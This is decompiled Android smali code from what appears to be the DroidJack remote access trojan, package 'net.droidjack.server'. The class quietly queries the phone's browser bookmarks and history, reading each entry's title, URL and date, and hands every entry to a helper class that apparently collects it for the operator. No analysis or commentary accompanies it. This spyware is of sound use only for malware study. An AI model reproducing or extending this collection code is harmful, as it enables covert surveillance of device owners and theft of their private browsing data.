.class public Lnet/droidjack/server/b;
.super Ljava/lang/Object;


# instance fields
.field private a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lnet/droidjack/server/b;->a:Landroid/content/Context;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 8

    const/4 v3, 0x0

    iget-object v0, p0, Lnet/droidjack/server/b;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    sget-object v2, Landroid/provider/Browser;->HISTORY_PROJECTION:[Ljava/lang/String;

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    new-instance v2, Lnet/droidjack/server/c;

    iget-object v0, p0, Lnet/droidjack/server/b;->a:Landroid/content/Context;

    invoke-direct {v2, v0}, Lnet/droidjack/server/c;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2}, Lnet/droidjack/server/c;->a()V

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_0

    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    return-void

    :cond_1
    const/4 v0, 0x5

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/4 v0, 0x1

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/4 v0, 0x3

    :try_start_0
    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    new-instance v5, Lnet/droidjack/server/ay;

    invoke-direct {v5, v0}, Lnet/droidjack/server/ay;-><init>(Ljava/lang/Long;)V

    invoke-virtual {v5}, Lnet/droidjack/server/ay;->a()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_1
    invoke-virtual {v2, v3, v4, v0}, Lnet/droidjack/server/c;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "-"

    goto :goto_1
.end method
